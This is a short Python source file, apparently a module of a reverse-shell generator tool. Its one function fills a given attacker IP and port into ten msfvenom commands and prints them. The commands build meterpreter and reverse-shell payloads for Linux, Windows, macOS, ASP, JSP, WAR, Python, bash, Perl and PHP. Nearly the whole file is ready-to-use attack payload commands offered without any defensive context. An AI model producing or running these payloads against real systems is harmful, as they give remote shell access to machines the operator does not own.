from rich.console import Console
from rich.syntax import Syntax
from rich.style import Style
import time

console = Console()

def OtherShell(ip, port):
    payload = """msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="%s" LPORT=%d -f elf > shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST="%s" LPORT=%d -f exe > shell.exe
msfvenom -p osx/x86/shell_reverse_tcp LHOST="%s" LPORT=%d -f macho > shell.macho
msfvenom -p windows/meterpreter/reverse_tcp LHOST="%s" LPORT=%d -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST="%s" LPORT=%d -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST="%s" LPORT=%d -f war > shell.war
msfvenom -p cmd/unix/reverse_python LHOST="%s" LPORT=%d -f raw > shell.py
msfvenom -p cmd/unix/reverse_bash LHOST="%s" LPORT=%d -f raw > shell.sh
msfvenom -p cmd/unix/reverse_perl LHOST="%s" LPORT=%d -f raw > shell.pl
msfvenom -p php/meterpreter_reverse_tcp LHOST="%s" LPORT=%d -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\\n' > shell.php && pbpaste >> shell.php""" % (ip, port, ip, port, ip, port, ip, port, ip, port, ip, port, ip, port, ip, port, ip, port, ip, port)
    myStyle = Style(color="#7780ff", bold=True)
    console.print("[red]Note:[/red]\n\tThese Reverse Shells are for msfvenom\n")
    console.print("\nThe payload is: \n", style=myStyle)
    synt = Syntax(payload,"bash",theme='dracula', line_numbers=True)
    console.print(synt)
    print("\n")